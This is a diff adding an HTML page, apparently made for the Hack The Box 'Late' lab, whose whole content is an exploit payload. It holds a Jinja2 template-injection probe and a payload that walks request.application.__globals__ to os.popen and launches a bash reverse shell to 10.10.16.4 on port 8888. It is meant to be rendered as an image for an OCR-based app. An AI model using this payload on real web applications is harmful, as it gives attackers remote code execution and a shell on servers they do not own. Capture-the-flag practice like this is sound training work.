@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<!-- saved from url=(0023)http://images.late.htb/ -->
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title>Image Reader</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@500&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="container" style="white-space: nowrap;min-width: 2048px; font-family: 'Roboto Mono', monospace;">
+    <h1 align="center">Image payload</h1>
+    <h4 align="center">{{ request.application }}</h4>
+    <h4 align="center">request.application.__globals__.__builtins__.__import__ ( "os" ).popen ( "bash -r ' bash -i &gt;&amp; /dev/tcp/10.10.16.4/8888 0 &gt;&amp; 1 ' " ).read ( )</h4>
+</div>
+
+</body>
+</html>
